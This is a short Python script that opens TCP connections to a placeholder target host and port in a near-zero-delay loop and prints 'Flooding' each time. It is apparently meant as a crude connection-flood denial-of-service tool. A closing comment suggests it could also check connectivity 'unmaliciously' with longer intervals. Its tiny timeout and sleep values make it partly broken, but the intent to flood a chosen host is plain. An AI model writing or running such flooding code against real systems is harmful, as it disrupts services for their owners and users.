import socket
import time

target_host = "000.000.000.000"  #Change this to your target host
target_port = 4444  #Change this to your target port

while True:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.00000000000001)  #Set a timeout for the connection attempt

    try:
        sock.connect((target_host, target_port))
        print(f"Flooding {target_host}:{target_port}")
        sock.close()
    except (ConnectionRefusedError, socket.timeout):
        print(f"Could not connect to {target_host}:{target_port}. Host may be down or port closed.")
    
    time.sleep(0.00000000000001) 

#Could also be used to check connection unmaliciously by changing the time intervals to something like 5 seconds
